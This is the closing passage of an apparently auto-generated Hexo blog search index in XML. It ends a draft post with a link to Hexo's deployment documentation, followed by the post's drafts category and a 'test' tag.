<p>更多信息: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      
        <categories>
            
            <category> 草稿箱 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> test </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
